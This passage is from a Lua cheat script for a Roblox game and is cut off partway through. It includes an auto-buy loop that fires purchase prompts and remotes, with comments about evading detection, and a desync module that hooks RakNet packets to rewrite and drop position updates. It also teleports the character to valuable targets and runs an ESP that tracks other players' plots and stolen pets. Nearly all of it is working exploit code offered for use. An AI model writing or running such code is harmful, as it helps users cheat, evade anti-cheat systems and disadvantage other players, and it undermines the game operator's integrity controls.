                for _,v in ipairs(net:GetChildren()) do
                    local nl = (v.Name or ""):lower()
                    for _,kw in ipairs(kws) do
                        if nl:find(kw) then purchaseRemote=v; return end
                    end
                end
                local paths = {"RF/ShopService/BuyAnimal","RF/AnimalShop/Purchase","RE/Shop/Buy","RF/Shop/Buy"}
                for _,p in ipairs(paths) do
                    local ok2,r = pcall(function() return Utility:LarpNet(p) end)
                    if ok2 and r and r.Parent then purchaseRemote=r; return end
                end
            end)
            return purchaseRemote
        end

        -- ── FAST + UNDETECTABLE PURCHASE ─────────────────────────────
        -- 1. fireproximityprompt (mimics real E press, no exploit sig)
        -- 2. Remote fallback in parallel (single call, not spammed)
        -- No getconnections, no HoldDuration manipulation
        local function firePurchaseNatural(prompt)
            if not prompt or not prompt.Parent or not prompt.Enabled then return end
            -- Primary: fireproximityprompt (exactly what the game does)
            pcall(function()
                if fireproximityprompt then fireproximityprompt(prompt) end
            end)
            -- Secondary: remote (single call, runs in parallel)
            task.spawn(function()
                local remote = resolvePurchaseRemote()
                if remote then
                    pcall(function()
                        if remote:IsA("RemoteFunction") then
                            remote:InvokeServer(prompt.Parent)
                        elseif remote:IsA("RemoteEvent") then
                            remote:FireServer(prompt.Parent)
                        end
                    end)
                end
            end)
        end

        -- ── CARPET LOCK ────────────────────────────────────────────────
        -- Keep carpet equipped and prevent unequip while auto buy is active
        local carpetLockConn = nil
        local function startCarpetLock()
            if carpetLockConn then carpetLockConn:Disconnect(); carpetLockConn = nil end
            local function ensureCarpet()
                pcall(function()
                    local char = LocalPlayer.Character
                    local hum  = char and char:FindFirstChildOfClass("Humanoid")
                    if not hum then return end
                    local toolName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
                    -- If not holding carpet, equip it
                    if not char:FindFirstChild(toolName) then
                        local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
                        if tool then hum:EquipTool(tool) end
                    end
                end)
            end
            -- Equip immediately with retries
            task.spawn(function()
                for _ = 1, 15 do
                    if not autoBuyActive then break end
                    ensureCarpet()
                    task.wait(0.3)
                    local char = LocalPlayer.Character
                    local toolName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
                    if char and char:FindFirstChild(toolName) then break end
                end
            end)
            -- Watch for unequip and re-equip
            carpetLockConn = RunService.Heartbeat:Connect(function()
                if not autoBuyActive then return end
                pcall(function()
                    local char = LocalPlayer.Character
                    local hum  = char and char:FindFirstChildOfClass("Humanoid")
                    if not hum then return end
                    local toolName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
                    if not char:FindFirstChild(toolName) then
                        local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
                        if tool then hum:EquipTool(tool) end
                    end
                end)
            end)
        end
        local function stopCarpetLock()
            if carpetLockConn then carpetLockConn:Disconnect(); carpetLockConn = nil end
        end

        -- ── HOVER: CARPET-BASED, NOT CFRAME TELEPORT ──────────────────
        -- Instead of hard-locking CFrame (detectable), we use the carpet's
        -- natural velocity control to stay above the target.
        -- The carpet already lets the player hover – we just point it at
        -- the target position and let the engine move naturally.
        local HOVER_HEIGHT  = 5
        local BUY_INTERVAL  = 0.08  -- fast but single fire each time
        local DETECT_RADIUS = 17

        local lockedTarget = nil
        local lockedPart   = nil
        local lockedModel  = nil
        local lastBuy      = 0

        local function partAlive()
            return lockedPart  and lockedPart.Parent
                and lockedModel and lockedModel.Parent
        end
        local function promptAlive()
            return lockedTarget and lockedTarget.prompt
                and lockedTarget.prompt.Parent and lockedTarget.prompt.Enabled
        end

        -- Lightweight proximity check only — no BodyPosition (detectable)
        local function destroyBodyPos() end  -- stub kept for compatibility

        -- PURCHASE SPAM (human-like interval)
        task.spawn(function()
            while true do
                task.wait(BUY_INTERVAL)
                if not autoBuyActive then continue end
                if not partAlive()   then continue end
                if promptAlive() then
                    firePurchaseNatural(lockedTarget.prompt)
                end
            end
        end)

        -- SCAN + VALIDATE
        task.spawn(function()
            while true do
                task.wait(0.25)
                if not autoBuyActive then
                    lockedTarget=nil; lockedPart=nil; lockedModel=nil
                    stopCarpetLock()
                    destroyBodyPos()
                    continue
                end
                if lockedPart or lockedModel then
                    if not partAlive() then
                        ShowNotification("AUTO BUY","Reached base, scanning...")
                        lockedTarget=nil; lockedPart=nil; lockedModel=nil
                    end
                    continue
                end
                local char = LocalPlayer.Character
                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end
                local radius = Config.AutoBuyRange or DETECT_RADIUS
                local best,bestDist = nil,math.huge
                for _,entry in ipairs(SharedState.ConveyorAnimals) do
                    if entry.prompt and entry.prompt.Parent and entry.prompt.Enabled
                    and entry.part  and entry.part.Parent then
                        local d = (hrp.Position - entry.part.Position).Magnitude
                        if d <= radius and d < bestDist then bestDist=d; best=entry end
                    end
                end
                if best then
                    lockedTarget = best
                    lockedPart   = best.part
                    lockedModel  = best.model or best.part.Parent
                    ShowNotification("AUTO BUY","AUTO BUY: "..best.name)
                    startCarpetLock()
                end
            end
        end)

        -- Start carpet lock when toggle fires
        _G.AutoBuyOnToggle = function(active)
            if active then
                if _G.refreshConveyor then _G.refreshConveyor() end
                startCarpetLock()
            else
                stopCarpetLock()
            end
        end
    end)

    _G.MiniActionsUI = {panel = panel, gui = maGui}
    return maGui

end

task.spawn(function()

    buildMiniActionsUI()

    -- Auto hide on start

    if Config.AutoHideMiniUI then

        local g = PlayerGui:FindFirstChild("BullysMiniActions")

        if g and g:FindFirstChild("MiniPanel") then

            g.MiniPanel.Visible = false

        end

    end

end)

task.spawn(function()
    local _desyncHooked = false
    local _desyncServerPos = Vector3.zero
    local _desyncLastPos = Vector3.zero

    local _dSendFn = function(packet)
        if packet and packet.PacketId == 0x1B then
            local b = packet.AsBuffer
            if b then buffer.writeu32(b, 1, 0xFFFFFFFF); packet:SetData(b) end
        end
    end

    local _dRecvFn = function(packet)
        if packet.PacketId == 0x1B or packet.PacketId == 0x86 then packet:Drop() end
    end

    local function _dHookOn()
        if _desyncHooked or not raknet then return end
        local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if h then _desyncServerPos = h.Position; _desyncLastPos = h.Position end
        pcall(function() raknet.add_send_hook(_dSendFn) end)
        pcall(function() raknet.add_recv_hook(_dRecvFn) end)
        _desyncHooked = true
    end

    local function _dHookOff()
        if not _desyncHooked then return end
        pcall(function() raknet.remove_send_hook(_dSendFn) end)
        pcall(function() raknet.remove_recv_hook(_dRecvFn) end)
        _desyncHooked = false
        local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if h then _desyncServerPos = h.Position; _desyncLastPos = h.Position end
    end

    _G._desyncToggle = function(enabled)
        if enabled then _dHookOn() else _dHookOff() end
    end

    for _, n in ipairs({"DesyncVisualizer", "_DesyncBall", "_DesyncDiamond"}) do
        local o = Workspace:FindFirstChild(n); if o then o:Destroy() end
    end

    LocalPlayer.CharacterAdded:Connect(function(c)
        local hrp = c:WaitForChild("HumanoidRootPart")
        _desyncServerPos = hrp.Position; _desyncLastPos = hrp.Position
    end)
    if LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then _desyncServerPos = hrp.Position; _desyncLastPos = hrp.Position end
    end

    local dOld = PlayerGui:FindFirstChild("DesyncUI"); if dOld then dOld:Destroy() end

    if Config.DesyncEnabled ~= false then _dHookOn() end
end)

-- ═══════════════════════════════════════════════════════════════════
-- SERVER POS VISUALIZER (visual-only, NÃO mexe na Desync)
-- Esqueleto do personagem (clone azul neon) na posição que o servidor
-- "acha" que você está. Heartbeat update + dist>25 sync + kneeOffset(-2.5).
-- ═══════════════════════════════════════════════════════════════════
task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    local PART_COLOR = Color3.fromRGB(60, 120, 220)    -- azul padrão
    local BEAM_COLOR = Color3.fromRGB(120, 180, 255)
    local TEXT_COLOR = Color3.fromRGB(200, 220, 255)

    local serverPos = Vector3.new(0, 0, 0)
    local lastPos   = Vector3.new(0, 0, 0)
    local cframeConnection

    local skeletonModel = nil    -- clone do personagem
    local skeletonParts = {}     -- map { realPart -> clonePart }
    local hrpAtt = nil           -- attachment no HRP do char real
    local skelAtt = nil          -- attachment no HRP do skeleton
    local beam = nil
    local billboard = nil
    local textLabel = nil
    local stickBones = nil       -- {head, isR15, char, bones={spine,lArm,...}}

    local function destroySkeleton()
        if skeletonModel and skeletonModel.Parent then pcall(function() skeletonModel:Destroy() end) end
        skeletonModel = nil
        skeletonParts = {}
        beam = nil
        billboard = nil
        textLabel = nil
        skelAtt = nil
        stickBones = nil
    end

    local function buildSkeleton(char)
        destroySkeleton()
        if not char then return end

        -- Sem proxy de corpo (sem caixa azul). Só uma âncora invisível pro beam/billboard.
        skeletonModel = Instance.new("Model")
        skeletonModel.Name = "BullysServerPosSkeleton"

        local realHrp = char:FindFirstChild("HumanoidRootPart")
        if not realHrp then
            skeletonModel:Destroy(); skeletonModel = nil
            return
        end

        local skelRoot = Instance.new("Part")
        skelRoot.Name = "AnchorRoot"
        skelRoot.Size = Vector3.new(0.1, 0.1, 0.1)
        skelRoot.Anchored = true
        skelRoot.CanCollide = false
        skelRoot.CanTouch = false
        skelRoot.CanQuery = false
        skelRoot.CastShadow = false
        skelRoot.Massless = true
        skelRoot.Transparency = 1
        skelRoot.CFrame = realHrp.CFrame
        skelRoot.Parent = skeletonModel
        skeletonParts[realHrp] = skelRoot

        skeletonModel.Parent = Workspace

        skelAtt = Instance.new("Attachment")
        skelAtt.Name = "BullysSkelBeamAtt"
        skelAtt.Parent = skelRoot

        beam = Instance.new("Beam")
        beam.Name = "BullysServerPosBeam"
        beam.Transparency = NumberSequence.new(0.4)
        beam.Color = ColorSequence.new(BEAM_COLOR)
        beam.Width0 = 0.08
        beam.Width1 = 0.08
        beam.FaceCamera = true
        beam.Attachment1 = skelAtt
        beam.Parent = skelRoot

        billboard = Instance.new("BillboardGui")
        billboard.Name = "BullysServerPosGui"
        billboard.Size = UDim2.new(0, 220, 0, 32)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.AlwaysOnTop = true
        billboard.Adornee = skelRoot
        billboard.Parent = skelRoot

        textLabel = Instance.new("TextLabel")
        textLabel.Name = "BullysPosLabel"
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextColor3 = TEXT_COLOR
        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 10, 30)
        textLabel.TextStrokeTransparency = 0.2
        textLabel.TextScaled = false
        textLabel.TextSize = 13
        textLabel.Text = "[POS] 0.0 st"
        textLabel.Parent = billboard

        -- ── STICK FIGURE (palito) ─────────────────────────────────────
        local function makeBonePart(name, thickness)
            local p = Instance.new("Part")
            p.Name = name
            p.Size = Vector3.new(thickness or 0.15, thickness or 0.15, 1)
            p.Anchored = true
            p.CanCollide = false; p.CanTouch = false; p.CanQuery = false
            p.CastShadow = false; p.Massless = true
            p.Material = Enum.Material.Neon
            p.Color = PART_COLOR
            p.Transparency = 0.15
            p.Parent = skeletonModel
            return p
        end

        local headPart = Instance.new("Part")
        headPart.Name = "StickHead"
        headPart.Shape = Enum.PartType.Ball
        headPart.Size = Vector3.new(1.1, 1.1, 1.1)
        headPart.Anchored = true
        headPart.CanCollide = false; headPart.CanTouch = false; headPart.CanQuery = false
        headPart.CastShadow = false; headPart.Massless = true
        headPart.Material = Enum.Material.Neon
        headPart.Color = PART_COLOR
        headPart.Transparency = 0.15
        headPart.Parent = skeletonModel

        local isR15 = char:FindFirstChild("UpperTorso") ~= nil
        local bones = {}
        if isR15 then
            bones.spine     = makeBonePart("Spine")
            bones.lArm      = makeBonePart("LArm")
            bones.lForearm  = makeBonePart("LForearm")
            bones.rArm      = makeBonePart("RArm")
            bones.rForearm  = makeBonePart("RForearm")
            bones.lThigh    = makeBonePart("LThigh")
            bones.lShin     = makeBonePart("LShin")
            bones.rThigh    = makeBonePart("RThigh")
            bones.rShin     = makeBonePart("RShin")
        else
            bones.spine = makeBonePart("Spine")
            bones.lArm  = makeBonePart("LArm")
            bones.rArm  = makeBonePart("RArm")
            bones.lLeg  = makeBonePart("LLeg")
            bones.rLeg  = makeBonePart("RLeg")
        end

        stickBones = { head = headPart, bones = bones, isR15 = isR15, char = char }
    end

    local function ensureHrpAtt()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        if not hrpAtt or not hrpAtt.Parent then
            if hrpAtt then pcall(function() hrpAtt:Destroy() end) end
            hrpAtt = Instance.new("Attachment")
            hrpAtt.Name = "BullysServerPosHrpAtt"
            hrpAtt.Parent = hrp
        end
        if beam then beam.Attachment0 = hrpAtt end
    end

    local function setupHrp(newHrp)
        if cframeConnection then cframeConnection:Disconnect() end
        cframeConnection = newHrp:GetPropertyChangedSignal("CFrame"):Connect(function()
            if Config.ServerPosVisualizerEnabled then
                serverPos = newHrp.Position
            end
        end)
    end

    local function updateVisibility()
        local visible = Config.ServerPosVisualizerEnabled == true
        if billboard then billboard.Enabled = visible end
        if beam then beam.Enabled = visible end
        -- Sem corpo visível; o anchor permanece transparente sempre
    end

    RunService.Heartbeat:Connect(function()
        if not Config.ServerPosVisualizerEnabled then
            if skeletonModel then updateVisibility() end
            return
        end

        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        if not skeletonModel or not skeletonModel.Parent then
            buildSkeleton(char)
        end
        ensureHrpAtt()

        local pos = hrp.Position
        local dist = (pos - lastPos).Magnitude
        if dist > 25 then
            serverPos = pos
        end
        lastPos = pos

        local kneeOffset = Vector3.new(0, -2.5, 0)
        local offset = (serverPos - pos) + kneeOffset

        for realPart, clonePart in pairs(skeletonParts) do
            if realPart.Parent and clonePart.Parent then
                clonePart.CFrame = realPart.CFrame + offset
            end
        end

        -- Atualiza stick figure (palito): posiciona cada bone entre os joints do char
        if stickBones and stickBones.char and stickBones.char.Parent then
            local sChar = stickBones.char
            local function partPos(name)
                local p = sChar:FindFirstChild(name)
                if p and p:IsA("BasePart") then return p.Position + offset end
                return nil
            end
            local function setBone(p, p1, p2, thickness)
                if not (p and p1 and p2) then return end
                local d = p2 - p1
                local len = d.Magnitude
                if len < 0.01 then return end
                p.Size = Vector3.new(thickness or 0.15, thickness or 0.15, len)
                local mid = (p1 + p2) / 2
                p.CFrame = CFrame.lookAt(mid, p2)
            end

            local hp = partPos("Head")
            if hp and stickBones.head then
                stickBones.head.CFrame = CFrame.new(hp)
            end

            if stickBones.isR15 then
                local ut = partPos("UpperTorso"); local lt = partPos("LowerTorso")
                setBone(stickBones.bones.spine, ut, lt)
                local lua = partPos("LeftUpperArm"); local lla = partPos("LeftLowerArm"); local lh = partPos("LeftHand")
                setBone(stickBones.bones.lArm, lua, lla)
                setBone(stickBones.bones.lForearm, lla, lh)
                local rua = partPos("RightUpperArm"); local rla = partPos("RightLowerArm"); local rh = partPos("RightHand")
                setBone(stickBones.bones.rArm, rua, rla)
                setBone(stickBones.bones.rForearm, rla, rh)
                local lul = partPos("LeftUpperLeg"); local lll = partPos("LeftLowerLeg"); local lf = partPos("LeftFoot")
                setBone(stickBones.bones.lThigh, lul, lll)
                setBone(stickBones.bones.lShin, lll, lf)
                local rul = partPos("RightUpperLeg"); local rll = partPos("RightLowerLeg"); local rf = partPos("RightFoot")
                setBone(stickBones.bones.rThigh, rul, rll)
                setBone(stickBones.bones.rShin, rll, rf)
            else
                local hd = partPos("Head"); local to = partPos("Torso")
                setBone(stickBones.bones.spine, hd, to)
                local la = partPos("Left Arm")
                setBone(stickBones.bones.lArm, to, la)
                local ra = partPos("Right Arm")
                setBone(stickBones.bones.rArm, to, ra)
                local ll = partPos("Left Leg")
                setBone(stickBones.bones.lLeg, to, ll)
                local rl = partPos("Right Leg")
                setBone(stickBones.bones.rLeg, to, rl)
            end
        end

        local distanceToServer = (serverPos - pos).Magnitude
        if textLabel then
            textLabel.Text = string.format("[POS] %.1f st", distanceToServer)
        end

        updateVisibility()
    end)

    _G._serverPosVizToggle = function(state)
        Config.ServerPosVisualizerEnabled = state == true
        if state then
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then
                serverPos = hrp.Position
                lastPos = hrp.Position
                buildSkeleton(char)
                ensureHrpAtt()
            end
        else
            destroySkeleton()
        end
        updateVisibility()
    end

    LocalPlayer.CharacterAdded:Connect(function(c)
        local hrp = c:WaitForChild("HumanoidRootPart")
        serverPos = hrp.Position
        lastPos = hrp.Position
        setupHrp(hrp)
        if Config.ServerPosVisualizerEnabled then
            task.wait(0.5)
            buildSkeleton(c)
            ensureHrpAtt()
        end
    end)

    if LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            serverPos = hrp.Position
            lastPos = hrp.Position
            setupHrp(hrp)
            if Config.ServerPosVisualizerEnabled then
                buildSkeleton(LocalPlayer.Character)
                ensureHrpAtt()
            end
        end
    end
end)

task.spawn(function()

    if not game:IsLoaded() then game.Loaded:Wait() end; task.wait(2)

    local BL={STOLEN=true,STEAL=true,PURCHASE=true,COMPRAR=true,BUY=true,COLLECT=true,COLETAR=true,CASH=true,VALUE=true,BASE=true,EMPTY=true,GENERATION=true,COMMON=true,UNCOMMON=true,RARE=true,EPIC=true,LEGENDARY=true,DIVINE=true,RAINBOW=true,CURSED=true,GOLD=true,DIAMOND=true,CANDY=true,MUTATION=true}

    local function cvOk(t) if not t or t=="" then return false end; local c=(t:gsub("<[^>]+>","")):match("^%s*(.-)%s*$") or ""; if #c<=1 then return false end; local u=c:upper(); if u:find("^%$") or u:find("/S$") or u:find("^[%d%.]+") then return false end; return not BL[u] end

    local function pgv(t) if type(t)~="string" then return nil end; local u=t:gsub("<[^>]+>",""):upper(); if not u:find("%$") or not u:find("/S") then return nil end; local c=u:gsub("%$",""):gsub("/S",""):gsub("%s+",""); local n=tonumber(c:match("[%d%.]+")); if not n then return nil end; if c:find("B") then return n*1e9 elseif c:find("M") then return n*1e6 elseif c:find("K") then return n*1e3 else return n end end

    local function exM(m) if not m then return nil,nil,0 end; local bN,bG,bV=nil,nil,0; for _,bb in ipairs(m:GetDescendants()) do if bb:IsA("BillboardGui") or bb:IsA("SurfaceGui") then for _,d in ipairs(bb:GetDescendants()) do if d:IsA("TextLabel") and d.Text then local v=pgv(d.Text); if v and v>bV then bV=v;bG=d.Text:gsub("<[^>]+>",""); local co=d.Parent; if co then local f=nil; for _,s in ipairs(co:GetChildren()) do if s:IsA("TextLabel") and s.Name=="DisplayName" then local c2=(s.Text or ""):gsub("<[^>]+>",""):match("^%s*(.-)%s*$"); if cvOk(c2) then f=c2;break end end end; if not f then local bt,bl=nil,0; for _,s in ipairs(co:GetChildren()) do if s:IsA("TextLabel") then local c2=(s.Text or ""):gsub("<[^>]+>",""):match("^%s*(.-)%s*$") or ""; if cvOk(c2) and #c2>bl then bt,bl=c2,#c2 end end end; if bt then f=bt end end; if f then bN=f end end end end end end end; return bN,bG,bV end

    local function scan() local res,vis={},{}; local deb=Workspace:FindFirstChild("Debris") or Workspace; for _,c in ipairs(deb:GetChildren()) do if c:IsA("Model") or c:IsA("BasePart") then local n,g,gv=exM(c); if gv and gv>0 then local p=c:IsA("BasePart") and c or (c:IsA("Model") and c.PrimaryPart); if not p then for _,ch in ipairs(c:GetChildren()) do if ch:IsA("BasePart") then p=ch;break end end end; if p then table.insert(vis,{name=n,gen=g,gv=gv,part=p,model=c}) end end end end; for _,obj in ipairs(Workspace:GetDescendants()) do if obj:IsA("ProximityPrompt") and obj.Enabled then local tx=(obj.ActionText or ""):lower(); if tx:find("purchase") or tx:find("comprar") or tx:find("buy") then local pp=obj.Parent; if not pp then continue end; local rp=pp:IsA("Attachment") and pp.Parent or pp; if not(rp and rp:IsA("BasePart")) then continue end; local fN,fG,fGV,fM="Brainrot","",0,nil; local md,mt=15,nil; for _,v in ipairs(vis) do local d=(v.part.Position-rp.Position).Magnitude; if d<md then md=d;mt=v end end; if mt then fN=mt.name or "Brainrot";fG=mt.gen or "";fGV=mt.gv or 0;fM=mt.model else local sr=rp;local cu=rp; while cu and cu.Parent and cu.Parent~=Workspace do sr=cu;cu=cu.Parent end; local n,g,gv=exM(sr); if n then fN=n end; if g then fG=g end; if gv and gv>0 then fGV=gv end; fM=sr end; table.insert(res,{name=fN,gen=fG,gv=fGV,prompt=obj,part=rp,model=fM,uid="conv_"..tostring(obj)}) end end end; return res end

    while true do task.wait(4); local ok2,found=pcall(scan); if ok2 and found then SharedState.ConveyorAnimals=found; local b=-1; for _,e in ipairs(found) do if(e.gv or 0)>b then b=e.gv end end; SharedState.BestConveyorGv=b end end

end)

local function tpToBestBrainrot()

    local bestBase,bestBaseGv=nil,-1; local cache=SharedState.AllAnimalsCache

    if cache then if Config.AutoTPPriority then for _,pN in ipairs(PRIORITY_LIST) do local sn=pN:lower(); for _,a in ipairs(cache) do if a and a.name and a.name:lower()==sn and a.owner~=LocalPlayer.Name then bestBase=a;bestBaseGv=tonumber(a.genValue) or 0;break end end; if bestBase then break end end end; if not bestBase then for _,a in ipairs(cache) do if a and a.owner~=LocalPlayer.Name then bestBase=a;bestBaseGv=tonumber(a.genValue) or 0;break end end end end

    SharedState.BestBaseGv=bestBaseGv

    local bestConv,bestConvGv=nil,-1; for _,e in ipairs(SharedState.ConveyorAnimals or {}) do local gv=tonumber(e.gv) or 0; if e.prompt and e.prompt.Parent and e.prompt.Enabled and e.part and e.part.Parent and gv>bestConvGv then bestConvGv=gv;bestConv=e end end; SharedState.BestConveyorGv=bestConvGv

    local useConv=bestConv and bestConv.part and bestConv.part.Parent and(not bestBase or bestConvGv>bestBaseGv)

    if useConv then ShowNotification("TP BEST","ESTEIRA → "..(bestConv.name or "?")); task.spawn(function() local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChild("Humanoid"); if not hrp or not hum then return end; local tool=LocalPlayer.Backpack:FindFirstChild(Config.TpSettings.Tool) or char:FindFirstChild(Config.TpSettings.Tool); if tool then hum:EquipTool(tool) end; hrp.CFrame=CFrame.new(bestConv.part.Position+Vector3.new(0,3,0)) end); return end

    if bestBase then ShowNotification("TP BEST","BASE → "..bestBase.name); SharedState.SelectedPetData={petName=bestBase.name,mpsText=bestBase.genText,mpsValue=bestBase.genValue,owner=bestBase.owner,plot=bestBase.plot,slot=bestBase.slot,uid=bestBase.uid,mutation=bestBase.mutation,animalData=bestBase}; task.spawn(runAutoSnipe)

    else ShowNotification("TP BEST","No brainrot found!") end

end

_G.tpToBestBrainrot=tpToBestBrainrot

task.spawn(function()

    local espGui = Instance.new("ScreenGui")

    espGui.Name = "XiStealingPlotESP"

    espGui.ResetOnSpawn = false

    espGui.Enabled = Config.ShowStealingPlotESP ~= false

    espGui.Parent = PlayerGui

    local byUser = {}

    local SyncStealEsp = nil

    local AnimalsDataStealEsp = nil

    local AnimalsSharedStealEsp = nil

    local function ensureStealEspModules()

        if not SyncStealEsp then

            pcall(function()

                SyncStealEsp = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))

            end)

        end

        if not AnimalsDataStealEsp then

            pcall(function()

                AnimalsDataStealEsp = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))

            end)

        end

        if not AnimalsSharedStealEsp then

            pcall(function()

                AnimalsSharedStealEsp = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))

            end)

        end

    end

    local function normStealName(s)

        return tostring(s or ""):lower():gsub("%s+", ""):gsub("[^%w]", "")

    end

    local function stealIdxMatchesAnimal(stealIdx, adIndex, displayName)

        if stealIdx == nil or stealIdx == "" then return false end

        local si = tostring(stealIdx)

        local sil = si:lower()

        if adIndex then

            local ai = tostring(adIndex)

            if ai == si or ai:lower() == sil then return true end

        end

        if displayName then

            local d = tostring(displayName)

            local dl = d:lower()

            if dl == sil or dl:find(sil, 1, true) or sil:find(dl, 1, true) then return true end

            if normStealName(d) == normStealName(si) then return true end

        end

        local AD = AnimalsDataStealEsp

        if AD then

            local infDirect = AD[si]

            if type(infDirect) == "table" and infDirect.DisplayName and displayName then

                if infDirect.DisplayName:lower() == displayName:lower() or normStealName(infDirect.DisplayName) == normStealName(displayName) then

                    return true

                end

            end

            if adIndex and AD[adIndex] and type(AD[adIndex]) == "table" and AD[adIndex].DisplayName then

                local disp = AD[adIndex].DisplayName

                if disp:lower() == sil or normStealName(disp) == normStealName(si) then return true end

            end

            for key, inf in pairs(AD) do

                if type(inf) == "table" and inf.DisplayName then

                    if key == si or key:lower() == sil then

                        if not displayName or inf.DisplayName:lower() == displayName:lower() or normStealName(inf.DisplayName) == normStealName(displayName) then

                            return true

                        end

                    end

                    if inf.DisplayName:lower() == sil or normStealName(inf.DisplayName) == normStealName(si) then

                        if adIndex and (key == adIndex or key:lower() == tostring(adIndex):lower()) then return true end

                        if displayName and (normStealName(inf.DisplayName) == normStealName(displayName) or inf.DisplayName:lower() == displayName:lower()) then

                            return true

                        end

                    end

                end

            end

        end

        return false

    end

    local function findPlotForPlayer(plr)

        if not plr then return nil end

        local plots = Workspace:FindFirstChild("Plots")

        if not plots then return nil end

        local dn = (plr.DisplayName or ""):lower()

        local un = (plr.Name or ""):lower()

        for _, plot in ipairs(plots:GetChildren()) do

            local sign = plot:FindFirstChild("PlotSign")

            if sign then

                local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)

                if surfaceGui then

                    local label = surfaceGui:FindFirstChildWhichIsA("TextLabel", true)

                    if label then

                        local text = label.Text:lower()

                        if (dn ~= "" and text:find(dn, 1, true)) or (un ~= "" and text:find(un, 1, true)) then

                            return plot

                        end

                    end

                end

            end

        end

        local pkg = ReplicatedStorage:FindFirstChild("Packages")

        local syncMod = pkg and pkg:FindFirstChild("Synchronizer")

        if syncMod then

            local okReq, Sync = pcall(function() return require(syncMod) end)

            if okReq and Sync then

                for _, plot in ipairs(plots:GetChildren()) do

                    local okCh, ch = pcall(function() return Sync:Get(plot.Name) end)

                    if okCh and ch then

                        local owner = ch:Get("Owner")

                        if owner then

                            if typeof(owner) == "Instance" and owner:IsA("Player") and owner == plr then

                                return plot

                            end

                            if type(owner) == "table" and owner.UserId == plr.UserId then

                                return plot

                            end

                        end

                    end

                end

            end

        end

        return nil

    end

    local function getPlotSignAdorneePart(plot)

        if not plot then return nil end

        local sign = plot:FindFirstChild("PlotSign")

        if not sign then return nil end

        if sign:IsA("BasePart") then return sign end

        if sign:IsA("Model") then

            return sign.PrimaryPart or sign:FindFirstChildWhichIsA("BasePart", true)

        end

        return sign:FindFirstChildWhichIsA("BasePart", true)

    end

    local function resolveStolenPetEntry(plr, stealIdx)

        if stealIdx == nil or stealIdx == "" then return nil end

        ensureStealEspModules()

        local myPlot = findPlotForPlayer(plr)

        local myPlotName = myPlot and myPlot.Name

        local cache = SharedState.AllAnimalsCache

        local best, bestGv = nil, -1

        local function considerEntry(entry, gv)

            if not entry or not entry.plot then return end

            if myPlotName and entry.plot == myPlotName then return end

            if entry.owner and entry.owner == plr.Name then return end

            local g = tonumber(gv) or tonumber(entry.genValue) or 0

            if g > bestGv then

                bestGv = g

                best = entry

            end

        end

        if cache then

            for _, a in ipairs(cache) do

                if a and a.name and a.owner and a.owner ~= plr.Name then

                    if stealIdxMatchesAnimal(stealIdx, nil, a.name) then

                        considerEntry(a, a.genValue)

                    end

                end

            end

        end

        if best then return best end

        if not SyncStealEsp or not AnimalsDataStealEsp then return nil end

        local plots = Workspace:FindFirstChild("Plots")

        if not plots then return nil end

        for _, plot in ipairs(plots:GetChildren()) do

            if not myPlotName or plot.Name ~= myPlotName then

                local okCh, ch = pcall(function() return SyncStealEsp:Get(plot.Name) end)

                if okCh and ch then

                    local owner = ch:Get("Owner")

                    local ownerName = nil

                    if typeof(owner) == "Instance" and owner:IsA("Player") then

                        ownerName = owner.Name

                    elseif type(owner) == "table" and owner.Name then

                        ownerName = owner.Name

                    end

                    if ownerName ~= plr.Name then

                        local al = ch:Get("AnimalList")

                        if type(al) == "table" then

                            for slot, ad in pairs(al) do

                                if type(ad) == "table" and ad.Index then

                                    local aInfo = AnimalsDataStealEsp[ad.Index]

                                    local disp = (aInfo and aInfo.DisplayName) or ad.Index

                                    if stealIdxMatchesAnimal(stealIdx, ad.Index, disp) then

                                        local gv = 0

                                        pcall(function()

                                            if AnimalsSharedStealEsp then

                                                gv = AnimalsSharedStealEsp:GetGeneration(ad.Index, ad.Mutation, ad.Traits, nil)

                                            end

                                        end)

                                        local gtFallback = ""
                                        if gv > 0 then pcall(function() gtFallback = "$"..NumUtils:ToString(gv).."/s" end) end

                                        considerEntry({

                                            name = disp,

                                            index = ad.Index,

                                            genText = gtFallback,

                                            genValue = gv,

                                            mutation = ad.Mutation,

                                            traits = "",

                                            owner = ownerName or "?",

                                            plot = plot.Name,

                                            slot = tostring(slot),

                                            uid = plot.Name .. "_" .. tostring(slot),

                                        }, gv)

                                    end

                                end

                            end

                        end

                    end

                end

            end

        end

        return best

    end

    local function clearRow(uid)

        local r = byUser[uid]

        if not r then return end

        if r.bill and r.bill.Parent then r.bill:Destroy() end

        byUser[uid] = nil

    end

    Players.PlayerRemoving:Connect(function(plr)

        clearRow(plr.UserId)

    end)

    while true do

        task.wait(0.6)

        local enabled = Config.ShowStealingPlotESP ~= false

        espGui.Enabled = enabled

        if not enabled then

            local clearIds = {}

            for uid in pairs(byUser) do table.insert(clearIds, uid) end

            for _, uid in ipairs(clearIds) do clearRow(uid) end

        else

            local attachFn = _G.XiAttachPet3DPreview

            local active = {}

